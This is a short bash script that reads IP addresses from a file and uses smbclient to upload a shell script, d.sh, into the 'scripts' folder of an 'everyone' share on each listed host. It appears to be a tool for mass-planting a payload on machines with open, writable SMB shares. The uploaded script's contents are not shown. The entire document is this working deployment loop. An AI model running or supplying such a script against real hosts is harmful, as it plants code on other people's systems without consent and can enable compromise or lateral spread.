#!/bin/bash
for i in $(cat ips.txt); do
	smbclient //$i/everyone/ -c "cd scripts; put /upload/d.sh d.sh";
done	
